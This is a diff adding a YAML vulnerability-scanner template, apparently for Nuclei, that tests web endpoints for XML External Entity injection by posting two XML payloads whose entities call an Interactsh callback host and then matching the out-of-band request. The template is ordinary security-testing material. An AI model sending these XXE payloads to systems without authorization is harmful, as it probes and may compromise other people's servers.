@@ -1,0 +1,46 @@
+id: bugbounty-xxe
+
+info:
+  name: XXE via XML Parameters
+  author: Justin Washek
+  severity: high
+  description: |
+    Tests for XML External Entity injection using Interactsh callbacks
+  tags: xxe,xml,injection,bugbounty
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    
+    headers:
+      Content-Type: "application/xml"
+    
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{{interactsh-url}}">]>
+      <root>&xxe;</root>
+
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    
+    headers:
+      Content-Type: "text/xml"
+    
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{{interactsh-url}}"> %xxe;]>
+      <root></root>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+    extractors:
+      - type: kval
+        part: interactsh_request
+        kval:
+          - raw-request
